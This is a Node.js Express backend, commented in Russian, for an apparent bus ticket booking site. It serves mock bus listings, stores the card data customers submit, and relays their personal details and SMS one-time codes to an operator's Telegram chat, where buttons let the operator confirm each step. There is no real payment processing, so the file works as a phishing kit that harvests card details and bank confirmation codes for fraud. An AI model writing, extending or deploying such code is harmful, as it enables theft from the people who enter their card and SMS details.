const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';

// Telegram Bot
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Middleware
app.use(cors({
  origin: [FRONTEND_URL, 'https://*.railway.app', 'http://localhost:3000'],
  credentials: true
}));
app.use(express.json());

// Хранилище заказов в памяти (в продакшене используйте базу данных)
const orders = new Map();
const pendingPayments = new Map();

// Маршруты для поиска билетов
app.get('/api/search-buses', (req, res) => {
  const { from, to, date } = req.query;
  
  // Мокированные данные автобусов
  const buses = [
    {
      id: '1',
      from: from,
      to: to,
      date: date,
      departureTime: '08:00',
      arrivalTime: '14:30',
      duration: '6ч 30м',
      price: 120,
      availableSeats: 15,
      operator: 'PolskiBus'
    },
    {
      id: '2',
      from: from,
      to: to,
      date: date,
      departureTime: '12:15',
      arrivalTime: '18:45',
      duration: '6ч 30м',
      price: 95,
      availableSeats: 8,
      operator: 'FlixBus'
    },
    {
      id: '3',
      from: from,
      to: to,
      date: date,
      departureTime: '18:30',
      arrivalTime: '01:00+1',
      duration: '6ч 30м',
      price: 85,
      availableSeats: 22,
      operator: 'Simple Express'
    }
  ];
  
  res.json(buses);
});

// Создание заказа
app.post('/api/create-order', (req, res) => {
  const { busId, passengerData } = req.body;
  const orderId = uuidv4();
  
  const order = {
    id: orderId,
    busId,
    passengerData,
    status: 'created',
    createdAt: new Date().toISOString()
  };
  
  orders.set(orderId, order);
  res.json({ orderId, status: 'created' });
});

// Обработка данных карты
app.post('/api/process-payment', async (req, res) => {
  const { orderId, cardData } = req.body;
  
  const order = orders.get(orderId);
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  // Сохраняем данные платежа
  order.cardData = cardData;
  order.status = 'payment_pending';
  
  // Отправляем уведомление в Telegram
  const message = `🎫 Новый заказ билета
📍 От: ${order.passengerData.from}
📍 До: ${order.passengerData.to}
📅 Дата: ${order.passengerData.date}
👤 Пассажир: ${order.passengerData.name}
📧 Email: ${order.passengerData.email}
📱 Телефон: ${order.passengerData.phone}
💳 Карта: **** **** **** ${cardData.number.slice(-4)}
💰 Сумма: ${order.passengerData.price} PLN

Order ID: ${orderId}`;

  try {
    const sentMessage = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Подтвердить данные', callback_data: `confirm_payment_${orderId}` },
            { text: '❌ Отклонить', callback_data: `reject_payment_${orderId}` }
          ]
        ]
      }
    });
    
    pendingPayments.set(orderId, {
      messageId: sentMessage.message_id,
      status: 'awaiting_confirmation'
    });
    
    res.json({ status: 'payment_sent_to_telegram' });
  } catch (error) {
    console.error('Ошибка отправки в Telegram:', error);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

// Проверка статуса платежа
app.get('/api/payment-status/:orderId', (req, res) => {
  const { orderId } = req.params;
  const order = orders.get(orderId);
  const payment = pendingPayments.get(orderId);
  
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  res.json({ 
    status: order.status,
    paymentStatus: payment?.status || 'unknown'
  });
});

// Отправка SMS кода
app.post('/api/send-sms-code', async (req, res) => {
  const { orderId, smsCode } = req.body;
  
  const order = orders.get(orderId);
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  order.smsCode = smsCode;
  order.status = 'sms_pending';
  
  const message = `📱 SMS код подтверждения: ${smsCode}
Order ID: ${orderId}`;
  
  try {
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Подтвердить SMS', callback_data: `confirm_sms_${orderId}` },
            { text: '🔄 Отправить новый', callback_data: `resend_sms_${orderId}` }
          ]
        ]
      }
    });
    
    res.json({ status: 'sms_sent_to_telegram' });
  } catch (error) {
    console.error('Ошибка отправки SMS в Telegram:', error);
    res.status(500).json({ error: 'Failed to send SMS to Telegram' });
  }
});

// Обработка callback от Telegram бота
bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  
  if (data.startsWith('confirm_payment_')) {
    const orderId = data.replace('confirm_payment_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'payment_confirmed';
      bot.editMessageText(message.text + '\n\n✅ Данные подтверждены!', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  } else if (data.startsWith('reject_payment_')) {
    const orderId = data.replace('reject_payment_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'payment_rejected';
      bot.editMessageText(message.text + '\n\n❌ Платеж отклонен!', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  } else if (data.startsWith('confirm_sms_')) {
    const orderId = data.replace('confirm_sms_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'completed';
      bot.editMessageText(message.text + '\n\n✅ SMS подтвержден! Заказ завершен.', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  } else if (data.startsWith('resend_sms_')) {
    const orderId = data.replace('resend_sms_', '');
    const order = orders.get(orderId);
    
    if (order) {
      order.status = 'sms_resend_requested';
      bot.editMessageText(message.text + '\n\n🔄 Запрошен новый SMS код.', {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    }
  }
  
  bot.answerCallbackQuery(callbackQuery.id);
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});